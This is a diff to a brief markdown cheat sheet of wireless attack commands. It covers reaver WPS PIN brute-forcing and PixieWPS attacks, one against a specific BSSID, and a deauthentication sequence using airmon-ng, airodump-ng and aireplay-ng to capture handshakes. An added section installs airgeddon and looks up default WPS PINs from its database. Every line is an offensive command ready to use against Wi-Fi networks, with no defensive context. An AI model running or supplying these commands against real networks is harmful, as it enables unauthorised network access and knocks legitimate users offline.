@@ -4,11 +4,17 @@
   reaver –b <BSSID> –i wlan0 -vv –S
   or 
   for PixieWPS attack you can use "-K" parameter
-  reaver -b 34:08:04:09:3D:38 -i wlan0mon -v -K
+  reaver -b 13:06:19:94:00:00 -i wlan0mon -v -K
 
 ## Deauthentication Attack ##
 
-airmon-ng start wlan0
-airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
-aireplay-ng -0 1 –a <BSSID> -c <client_Mac> wlan0
+  airmon-ng start wlan0
+  airodump-ng –c <channel> --bssid <BSSID> -w <capture_file> wlan0
+  aireplay-ng -0 1 –a <BSSID> -c <client_Mac> wlan0
+
+## Extra - Implementation Variations ##
+
+  sudo apt install airgeddon
+  source /usr/share/airgeddon/known_pins.db
+  echo ${PINDB["0013F7"]}
 
